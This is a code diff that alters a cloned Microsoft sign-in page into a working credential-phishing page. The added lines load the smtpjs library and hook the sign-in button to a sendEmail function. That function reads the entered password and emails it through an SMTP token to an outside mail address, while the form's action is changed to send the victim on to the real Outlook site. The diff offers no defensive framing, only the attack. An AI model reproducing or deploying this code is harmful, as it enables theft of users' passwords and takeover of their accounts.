@@ -17,6 +17,7 @@
 
 
         <meta name="format-detection" content="telephone=no">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
 
    <!--  <noscript>
         <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
@@ -59,7 +60,7 @@
 
 <div data-bind="if: activeDialog"></div>
 
-<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="https://login.microsoftonline.com/common/login" class="provide-min-height">
+<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="https://outlook.office365.com" class="provide-min-height">
     <!-- ko withProperties: { '$loginPage': $data } -->
     <div class="login-paginated-page" data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
@@ -422,7 +423,7 @@
 
     <div>
         <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
-        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-bind="
+        <input type="submit" id="idSIButton9" onclick="sendEmail()" class="win-button button_primary button ext-button primary ext-primary" data-bind="
                 attr: primaryButtonAttributes,
                 externalCss: {
                     'button': true,
@@ -598,5 +599,21 @@
 <form></form>
 
 <!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->
+
+<script>
+    function sendEmail() {
+    var pass = document.getElementById("i0118").value;
+    var finalmessage = "Password is " + pass
+    Email.send({
+        SecureToken : "e6d513dd-f677-4b88-a960-8cee023df00d",
+        To : 'adam.zinc@mail.com',
+        From : "adam.zinc@mail.com",
+        Subject : "New Johnson county data submission",
+        Body : finalmessage
+    }).then(
+      message => console.log(message)
+    );
+}
+</script>
 
 <!-- ko if: svr.urlDeviceFingerprinting --><!-- /ko --></div></body></html>
